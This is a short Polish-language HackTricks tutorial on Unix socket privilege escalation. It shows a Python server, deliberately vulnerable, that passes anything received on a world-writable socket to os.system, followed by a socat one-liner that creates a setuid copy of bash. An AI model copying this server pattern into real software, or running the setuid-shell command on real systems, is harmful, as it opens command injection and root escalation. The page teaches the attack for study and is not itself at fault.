{{#include ../../banners/hacktricks-training.md}}

## Przykład wiązania gniazda z użyciem Pythona

W poniższym przykładzie **tworzone jest gniazdo unixowe** (`/tmp/socket_test.s`), a wszystko, co **otrzymane**, będzie **wykonywane** przez `os.system`. Wiem, że nie znajdziesz tego w rzeczywistości, ale celem tego przykładu jest zobaczenie, jak wygląda kod używający gniazd unixowych oraz jak zarządzać wejściem w najgorszym możliwym przypadku.
```python:s.py
import socket
import os, os.path
import time
from collections import deque

if os.path.exists("/tmp/socket_test.s"):
os.remove("/tmp/socket_test.s")

server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind("/tmp/socket_test.s")
os.system("chmod o+w /tmp/socket_test.s")
while True:
server.listen(1)
conn, addr = server.accept()
datagram = conn.recv(1024)
if datagram:
print(datagram)
os.system(datagram)
conn.close()
```
**Wykonaj** kod używając pythona: `python s.py` i **sprawdź, jak gniazdo nasłuchuje**:
```python
netstat -a -p --unix | grep "socket_test"
(Not all processes could be identified, non-owned process info
will not be shown, you would have to be root to see it all.)
unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        /tmp/socket_test.s
```
**Eksploatacja**
```python
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
```
{{#include ../../banners/hacktricks-training.md}}
